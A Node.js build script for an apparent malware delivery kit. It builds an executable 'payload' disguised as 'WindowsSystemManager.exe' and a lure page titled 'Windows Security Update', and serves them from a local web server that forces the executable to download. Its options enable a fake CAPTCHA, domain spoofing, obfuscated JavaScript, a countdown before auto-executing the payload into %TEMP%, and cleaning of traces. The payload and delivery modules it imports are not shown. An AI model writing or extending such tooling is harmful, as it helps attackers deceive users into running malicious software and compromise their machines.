'use strict';

/**
 * Main build script for the WASM proxy system with Mojo-based browser delivery
 * 
 * This script provides a command-line interface for building and deploying
 * both the executable payload and the browser-based delivery page.
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const crypto = require('crypto');
const yargs = require('yargs');
const { hideBin } = require('yargs/helpers');

// Import delivery modules
const mojoDelivery = require('./delivery/mojo-delivery');
const exeBuilder = require('./delivery/build_exe');

// Parse command line arguments
const argv = yargs(hideBin(process.argv))
  .usage('Usage: $0 [options]')
  .option('build-exe', {
    alias: 'e',
    description: 'Build the executable payload',
    type: 'boolean',
    default: true
  })
  .option('build-delivery', {
    alias: 'd',
    description: 'Build the browser delivery page',
    type: 'boolean',
    default: true
  })
  .option('output-dir', {
    alias: 'o',
    description: 'Output directory for all artifacts',
    type: 'string',
    default: path.join(__dirname, '../dist')
  })
  .option('payload-url', {
    alias: 'u',
    description: 'URL where the payload will be hosted',
    type: 'string',
    default: 'http://localhost:8080/payload.exe'
  })
  .option('page-title', {
    description: 'Title for the delivery page',
    type: 'string',
    default: 'Windows Security Update'
  })
  .option('countdown', {
    description: 'Countdown in seconds before auto-installing',
    type: 'number',
    default: 5
  })
  .option('exe-name', {
    description: 'Name of the executable to generate',
    type: 'string',
    default: 'WindowsSystemManager.exe'
  })
  .option('serve', {
    alias: 's',
    description: 'Start a local web server to serve the delivery page',
    type: 'boolean',
    default: false
  })
  .option('port', {
    alias: 'p',
    description: 'Port for the local web server',
    type: 'number',
    default: 8080
  })
  .option('verbose', {
    alias: 'v',
    description: 'Enable verbose logging',
    type: 'boolean',
    default: false
  })
  .option('clean', {
    alias: 'c',
    description: 'Clean output directory before building',
    type: 'boolean',
    default: false
  })
  .option('obfuscate', {
    description: 'Obfuscate JavaScript in delivery page',
    type: 'boolean',
    default: true
  })
  .option('auto-execute', {
    description: 'Automatically execute payload after download',
    type: 'boolean',
    default: true
  })
  .help()
  .alias('help', 'h')
  .version(false)
  .argv;

// Configuration from command line args
const config = {
  buildExe: argv.buildExe,
  buildDelivery: argv.buildDelivery,
  outputDir: argv.outputDir,
  payloadUrl: argv.payloadUrl,
  pageTitle: argv.pageTitle,
  countdownSeconds: argv.countdown,
  exeName: argv.exeName,
  serve: argv.serve,
  port: argv.port,
  verbose: argv.verbose,
  clean: argv.clean,
  obfuscate: argv.obfuscate,
  autoExecute: argv.autoExecute
};

/**
 * Logs a message if verbose mode is enabled
 * @param {string} message - Message to log
 */
function verboseLog(message) {
  if (config.verbose) {
    console.log(`[VERBOSE] ${message}`);
  }
}

/**
 * Ensures the output directory exists
 */
function ensureOutputDir() {
  if (!fs.existsSync(config.outputDir)) {
    fs.mkdirSync(config.outputDir, { recursive: true });
    console.log(`[+] Created output directory: ${config.outputDir}`);
  } else if (config.clean) {
    // Clean directory if requested
    console.log(`[+] Cleaning output directory: ${config.outputDir}`);
    const files = fs.readdirSync(config.outputDir);
    for (const file of files) {
      const filePath = path.join(config.outputDir, file);
      fs.unlinkSync(filePath);
      verboseLog(`Removed file: ${filePath}`);
    }
  }
}

/**
 * Builds the executable payload
 * @returns {string} Path to the built executable
 */
function buildExecutable() {
  console.log('[+] Building executable payload...');
  
  // Apply configuration to exe builder
  exeBuilder.config.exeName = config.exeName;
  exeBuilder.config.outputDir = config.outputDir;
  
  // Build the executable
  try {
    const exePath = exeBuilder.build();
    console.log(`[+] Executable built successfully: ${exePath}`);
    return exePath;
  } catch (error) {
    console.error(`[-] Error building executable: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Builds the browser delivery page
 * @param {string} exePath - Path to the built executable
 * @returns {string} Path to the delivery HTML file
 */
function buildDeliveryPage(exePath) {
  console.log('[+] Building delivery page...');
  
  const deliveryOptions = {
    payload_url: config.payloadUrl,
    output_path: path.join(config.outputDir, 'delivery.html'),
    page_title: config.pageTitle,
    show_countdown: config.countdownSeconds > 0,
    countdown_seconds: config.countdownSeconds,
    fake_captcha: true,
    domain_spoofing: true,
    obfuscate: config.obfuscate,
    auto_execute: config.autoExecute,
    target_folder: '%TEMP%\\WindowsSystem',
    filename: path.basename(exePath || config.exeName),
    clean_traces: true
  };
  
  try {
    mojoDelivery.createDeliveryHTML(deliveryOptions);
    console.log(`[+] Delivery page built successfully: ${deliveryOptions.output_path}`);
    return deliveryOptions.output_path;
  } catch (error) {
    console.error(`[-] Error building delivery page: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Starts a local web server to serve the delivery page and payload
 * @param {string} htmlPath - Path to the delivery HTML file
 * @param {string} exePath - Path to the executable payload
 */
function startServer(htmlPath, exePath) {
  console.log(`[+] Starting local web server on port ${config.port}...`);
  
  // For a simple demo, we'll use a script that launches an http-server
  // In a real implementation, this would be more sophisticated
  
  try {
    // Create a server script
    const serverScriptPath = path.join(config.outputDir, 'server.js');
    
    fs.writeFileSync(serverScriptPath, `
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = ${config.port};
const BASE_DIR = "${config.outputDir.replace(/\\/g, '\\\\')}";

// MIME types for different file extensions
const MIME_TYPES = {
  '.html': 'text/html',
  '.exe': 'application/octet-stream',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
  '.wasm': 'application/wasm'
};

const server = http.createServer((req, res) => {
  console.log(\`[\${new Date().toISOString()}] \${req.method} \${req.url}\`);
  
  // Parse URL and get pathname
  const parsedUrl = url.parse(req.url);
  let pathname = \`\${BASE_DIR}\${parsedUrl.pathname}\`;
  
  // Handle root path
  if (parsedUrl.pathname === '/') {
    pathname = "${htmlPath.replace(/\\/g, '\\\\')}";
  }
  
  // Handle payload request
  if (parsedUrl.pathname === '/payload.exe') {
    pathname = "${exePath ? exePath.replace(/\\/g, '\\\\') : ''}";
  }
  
  // Check if file exists
  fs.stat(pathname, (err, stats) => {
    if (err) {
      // If file not found
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('404 Not Found');
      return;
    }
    
    // If it's a directory, try to serve index.html
    if (stats.isDirectory()) {
      pathname = path.join(pathname, 'delivery.html');
    }
    
    // Read file
    fs.readFile(pathname, (err, data) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('500 Internal Server Error');
        return;
      }
      
      // Get file extension and content type
      const ext = path.parse(pathname).ext;
      const contentType = MIME_TYPES[ext] || 'application/octet-stream';
      
      // Special handling for executables to make them download
      const headers = { 'Content-Type': contentType };
      if (ext === '.exe') {
        headers['Content-Disposition'] = 'attachment; filename="${path.basename(exePath || config.exeName)}"';
      }
      
      // Serve the file
      res.writeHead(200, headers);
      res.end(data);
    });
  });
});

server.listen(PORT, () => {
  console.log(\`[+] Server running at http://localhost:\${PORT}/\`);
  console.log(\`[+] Serving delivery page: http://localhost:\${PORT}/\`);
  console.log(\`[+] Payload URL: http://localhost:\${PORT}/payload.exe\`);
  console.log(\`[+] Press Ctrl+C to stop the server\`);
});
    `);
    
    console.log(`[+] Starting server...`);
    // Execute the server script
    execSync(`node "${serverScriptPath}"`, { stdio: 'inherit' });
  } catch (error) {
    console.error(`[-] Error starting server: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Main function
 */
function main() {
  console.log('[+] Starting build process...');
  console.log('[+] Configuration:');
  console.log(JSON.stringify(config, null, 2));
  
  // Ensure output directory exists
  ensureOutputDir();
  
  // Build exe if requested
  let exePath = null;
  if (config.buildExe) {
    exePath = buildExecutable();
  }
  
  // Build delivery page if requested
  let htmlPath = null;
  if (config.buildDelivery) {
    htmlPath = buildDeliveryPage(exePath);
  }
  
  // Start server if requested
  if (config.serve && htmlPath) {
    startServer(htmlPath, exePath);
  }
  
  console.log('[+] Build process completed successfully!');
  
  if (!config.serve) {
    console.log('[+] To serve the delivery page:');
    console.log(`    - Run: node src/build.js --serve`);
    console.log(`    - Or start your own web server in ${config.outputDir}`);
  }
}

// Execute if this script is run directly
if (require.main === module) {
  main();
}

module.exports = {
  build: main,
  config
};
